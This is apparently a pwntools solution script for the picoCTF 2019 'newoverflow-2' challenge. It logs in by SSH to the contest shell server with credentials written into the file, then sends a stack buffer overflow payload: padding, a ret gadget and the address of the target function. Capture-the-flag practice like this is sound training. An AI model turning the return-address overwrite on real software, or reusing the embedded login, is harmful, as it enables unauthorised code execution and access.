#coding=utf-8
from pwn import *

debug = 0
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df')
    p = s.process('./vuln')

buf = 0x7fffffffe320
target = 0x40084d
ret = 0x7fffffffe368
gadget_ret = 0x4008b1
payload = 'a' * (ret - buf) + p64(gadget_ret) + p64(target)
log.info(payload)
p.sendline(payload)
print p.recvall(1)
